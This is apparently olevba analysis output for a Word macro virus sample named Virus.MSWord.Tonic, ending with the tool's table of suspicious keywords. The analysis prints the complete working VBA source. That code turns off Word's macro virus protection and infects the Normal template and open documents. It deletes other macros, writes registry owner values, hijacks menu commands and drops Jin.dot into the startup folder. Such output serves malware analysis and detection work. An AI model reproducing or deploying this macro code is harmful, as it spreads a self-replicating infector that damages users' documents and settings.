olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'>>-- J1nt0 -->
'@;-'-  I miss U  ;-)
-------------------------------------------------------------------------------
VBA MACRO Pand4.bas 
in file: Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3 - OLE stream: 'Macros/VBA/Pand4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Function Pemakai()
With Application
    .UserName = "J1nt0"
    .UserInitials = "J1n"
    .UserAddress = "STM133PDG"
End With
End Function
Function CekMacro()
On Error Resume Next
    Application.ShowVisualBasicEditor = False
    Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
    Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
    
    If NT.Lines(1, 1) <> "'>>-- J1nt0 -->" Then
    NT.DeleteLines 1, NT.CountOfLines
    NT.InsertLines 1, "'>>-- J1nt0 -->" & Chr(13) & _
                      "'@;-'-  I miss U  ;-)"
    End If

If AD.Lines(1, 1) <> "'>>-- J1nt0 -->" Then
AD.DeleteLines 1, AD.CountOfLines
AD.InsertLines 1, "'>>-- J1nt0 -->" & Chr(13) & _
                  "'@;-'-  I miss U  ;-)"
End If
    If ActiveDocument.VBProject.Name <> "J1nt0" Then
    ActiveDocument.VBProject.Name = "J1nt0"
    End If

Dim Doc As Boolean
Doc = False
    For Each Acd In ActiveDocument.VBProject.VBComponents
    If Acd.Name = "Pand4" And Acd.Name = "P4nd4" Then Doc = True
        If Acd.Name <> "Pand4" And Acd.Name <> "ThisDocument" And Acd.Name <> "P4nd4" Then
        Application.OrganizerDelete Source:=ActiveDocument.FullName, _
        Name:=Acd.Name, Object:=wdOrganizerObjectProjectItems: Beep
    End If
    Next Acd
    If Doc = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="Pand4", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
    Destination:=ActiveDocument, Name:="P4nd4", Object:=wdOrganizerObjectProjectItems
    End If

    Dim Nor As Boolean
    Nor = False
    For Each Ntl In NormalTemplate.VBProject.VBComponents
        If Ntl.Name = "Pand4" And Ntl.Name = "P4nd4" Then Nor = True
        If Ntl.Name <> "P4nd4" And Ntl.Name <> "Pand4" And Ntl.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Ntl.Name, Object:=wdOrganizerObjectProjectItems: Beep
        End If
    Next Ntl
    If Nor = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="Pand4", Object:=wdOrganizerObjectProjectItems
          Application.OrganizerCopy Source:=ActiveDocument.FullName, _
          Destination:=NormalTemplate.FullName, Name:="P4nd4", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
        Pemakai
    End If
End Function
Function Protect()
With Options
     .VirusProtection = False
     .SaveNormalPrompt = False
     .ConfirmConversions = False
End With
End Function
Sub FileOpen()
On Error GoTo Salah
   Protect
WT
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
    PandA
    ActiveDocument.Save
    End If
Salah:
End Sub
Sub AutoOpen()
On Error GoTo Salah
WT
   PandA
   ActiveDocument.Save
Salah:
End Sub
Sub AutoClose()
On Error GoTo Salah
  If ActiveDocument.Path <> "" And Left(ActiveDocument = "Document", 8) Then
  PandA
  ActiveDocument.Save
  End If
Salah:
End Sub
Sub FileClose()
AutoClose
ActiveDocument.Close
End Sub
Sub FileSave()
On Error GoTo Salah
  PandA
   If ActiveDocument.Saved = False Then ActiveDocument.Save
Salah:
End Sub
Function CekRegistri()
On Error GoTo Salah
Dim Src

If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") <> "PandA" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "PandA"
  System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "J1nt0 Here Now !, Sorry"
End If

Salah:
End Function
Sub ViewVbCode()
On Error Resume Next
SendKeys "%m%s{down}~%d 'Maaf yg merasa terganggu !?, By J1nt0.PD"
End Sub
Sub ToolsMacro()
  ViewVbCode
End Sub
Sub PandA()
Attribute PandA.VB_Description = "Macro created 15/01/00 by  Jun1aNT0.TK97"
On Error GoTo Gagal
Protect
CekRegistri
CekMacro
Gagal:
End Sub
Sub BukaEditor()
Dim Pesan
On Error Resume Next
Pesan = InputBox("Password Anda ...!?")
    If Pesan = "TK97" Then
    Application.ShowVisualBasicEditor = True
        Else
        MsgBox "Password anda salah", vbCritical + vbOKOnly, "Error"
        Application.Quit
        End If
End Sub
Sub FileTemplates()
  Dialogs(87).Display
End Sub
Function WT()
WordBasic.DisableAutoMacros True
End Function
Function WF()
WordBasic.DisableAutoMacros False
End Function
Sub FileExit()
On Error GoTo Gagal
WF
If Documents.Count <> 0 Then
 For i = 1 To Documents.Count
  Documents(i).Close
 Next i
End If
If Dir(Application.StartupPath) <> "Jin.dot" And Dir(Application.StartupPath) <> "Jin.src" Then
Application.Visible = False
Documents.Add
    With ActiveDocument
        .SaveAs FileName:=Application.StartupPath & "\Jin.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Application.StartupPath & "\Jin.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If

If Day(Now) = 28 Or Day(Now) = 12 Then
 P4nd4.Show
End If
WT
Application.Quit
Gagal:
WT
Application.Quit
End Sub
Sub AutoExit()
FileExit
End Sub
Sub AutoExec()
Attribute AutoExec.VB_Description = "For Some1.Isd, @;-'-  You will always in my heart "
On Error GoTo Salah
  Protect
  WordBasic.DisableAutoMacros True
  PandA
Salah:
'Assalamualaikum, Numpang lewat nih ...!
'Maaf buat Rekan-rekan yang merasa terganggu dengan keberadaan macro ini
End Sub
-------------------------------------------------------------------------------
VBA MACRO P4nd4.frm 
in file: Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3 - OLE stream: 'Macros/VBA/P4nd4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 















































































Private Sub Label1_Click()
Love.Top = (Application.Height - 50)
Love.Left = 5
Love.Caption = "For some1 I Love U"
End Sub

Private Sub UserForm_Activate()
Application.Visible = False
BMP = Application.System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Control Panel\Desktop", "Wallpaper")
Me.Picture = LoadPicture(BMP)
Me.Top = 0: Me.Left = 0
Me.Width = Application.Width - 5
Me.Height = Application.Height

Nama = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner")
If Nama <> "" Then
Me.Caption = "Thanx to " & Nama
End If

If Day(Now) = 12 Then
L2.Caption = "This is my day, Happy birthday ..."
ElseIf Day(Now) = 28 Then
L2.Caption = "This is our day, Let's Party ..."

End If
End Sub

Private Sub UserForm_QueryClose(Cancel As Integer, CloseMode As Integer)
Application.Quit
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3' - OLE stream: 'Macros/P4nd4/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Maaf bila mengganggu ...!?G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3' - OLE stream: 'Macros/P4nd4/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS�G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3' - OLE stream: 'Macros/P4nd4/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�By J1nt0.PDW�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3' - OLE stream: 'Macros/P4nd4/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3' - OLE stream: 'Macros/P4nd4/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3' - OLE stream: 'Macros/P4nd4/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'L1'" IN 'Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3' - OLE stream: 'Macros/P4nd4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3' - OLE stream: 'Macros/P4nd4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Love'" IN 'Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3' - OLE stream: 'Macros/P4nd4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'L2'" IN 'Virus.MSWord.Tonic-330f3fdf2ba2b0a404dad0fe4510af00a865b1d3' - OLE stream: 'Macros/P4nd4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Label1_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

